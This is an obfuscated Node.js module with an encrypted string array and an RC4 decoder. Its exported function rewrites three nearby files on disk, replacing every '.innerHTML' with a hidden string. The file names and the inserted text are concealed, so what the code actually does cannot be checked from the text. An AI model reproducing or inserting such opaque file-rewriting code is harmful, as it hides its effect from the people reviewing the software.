'use strict';
var vip = "vip.v6";
var _0x1513 = [vip, "a3fDpcOXwqMXCggAbsOtNjceLsKnH8Ocw7IZw4vDp8Okw7nDssKkKMKHw77DmsKbwobCp2fCgsK3wrYEwpvDgcKKXDHCnlM=", "BMO2wqkvw7UEZcOmwovDtXJLwrvCt8ODwqHCoURWD8OfC2lZwr1Ww53DuCZjcsOQwpvCuEUswpXCmcKIwplCw48KQsOkGsK8X8O6wq8fIw0=", "DcOgNsKHGE1Tw6tWLEo9YMKTwpDDjSgrdhBdw5vCgzQIPArDt8OEQ1kwLhPCq095w7vCsSrClsOqFiRJwr3Cr8KFRsOcw5bDssKRw4MOw7PDvcKSTcONwrBYwqnDvQ==", "w7jDvihD", "wqDDihjCuHU=", "csO4wp1c", "woXCiVPCr1nDuC8=", "wpAUwobCgXbDgcOP", "NDHDvsKQMBzCjznDtzjDj3XCuFppw7M=", "wrA1wpfClFg=", "wqZPZiE=", 
"wq53wpgm", "vYyLrip.v6dyxBDqPDSJXkS=="];
(function(obj, count, long) {
  var fn = function(to, value, str, val, key) {
    value = value >> 8;
    key = "po";
    var str = "shift";
    var method = "push";
    if (value < to) {
      for (; --to;) {
        val = obj[str]();
        if (value === to) {
          value = val;
          str = obj[key + "p"]();
        } else {
          if (value && str["replace"](/[YyLrdyxBDqPDSJXkS=]/g, "") === value) {
            obj[method](val);
          }
        }
      }
      obj[method](obj[str]());
    }
    return 662886;
  };
  return fn(++count, long) >> count ^ long;
})(_0x1513, 262, 67072);
var _0xcbba = function(a, opt_max) {
  a = ~~"0x"["concat"](a);
  var value = _0x1513[a];
  if (_0xcbba["vgXWks"] === undefined) {
    (function() {
      var jid = typeof window !== "undefined" ? window : typeof process === "object" && typeof require === "function" && typeof global === "object" ? global : this;
      var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!jid["atob"]) {
        jid["atob"] = function(i) {
          var str = String(i)["replace"](/=+$/, "");
          var bc = 0;
          var bs;
          var buffer;
          var Y = 0;
          var pix_color = "";
          for (; buffer = str["charAt"](Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
            buffer = listeners["indexOf"](buffer);
          }
          return pix_color;
        };
      }
    })();
    var testcase = function(data, fn) {
      var secretKey = [];
      var y = 0;
      var temp;
      var testResult = "";
      var tempData = "";
      data = atob(data);
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      data = decodeURIComponent(tempData);
      var x = 0;
      for (; x < 256; x++) {
        secretKey[x] = x;
      }
      x = 0;
      for (; x < 256; x++) {
        y = (y + secretKey[x] + fn["charCodeAt"](x % fn["length"])) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
      }
      x = 0;
      y = 0;
      var i = 0;
      for (; i < data["length"]; i++) {
        x = (x + 1) % 256;
        y = (y + secretKey[x]) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
        testResult = testResult + String["fromCharCode"](data["charCodeAt"](i) ^ secretKey[(secretKey[x] + secretKey[y]) % 256]);
      }
      return testResult;
    };
    _0xcbba["onIrVQ"] = testcase;
    _0xcbba["iVEMrv"] = {};
    _0xcbba["vgXWks"] = !![];
  }
  var A = _0xcbba["iVEMrv"][a];
  if (A === undefined) {
    if (_0xcbba["cSWnTy"] === undefined) {
      _0xcbba["cSWnTy"] = !![];
    }
    value = _0xcbba["onIrVQ"](value, opt_max);
    _0xcbba["iVEMrv"][a] = value;
  } else {
    value = A;
  }
  return value;
};
const path = require(_0xcbba("0", "qkX]"));
const fs = require("fs");
module["exports"] = function() {
  var values = {
    "RDayO" : _0xcbba("1", "[ytS"),
    "vwKRT" : _0xcbba("2", "RRT]"),
    "rzhAZ" : _0xcbba("3", "JyY]"),
    "mMWFS" : _0xcbba("4", "6Ckt")
  };
  const _0x1b12cc = [path[_0xcbba("5", "^XQy")](__dirname, values[_0xcbba("6", "dl%u")]), path[_0xcbba("7", "E7eV")](__dirname, values["rzhAZ"]), path["join"](__dirname, values["mMWFS"])];
  _0x1b12cc[_0xcbba("8", "fL#o")]((path) => {
    const filter = fs["readFileSync"](path, {
      "encoding" : values["RDayO"]
    });
    fs["writeFileSync"](path, filter[_0xcbba("9", "c7K8")](/\.innerHTML\b/g, _0xcbba("a", "U75h")), {
      "encoding" : values[_0xcbba("b", "c7K8")]
    });
  });
};

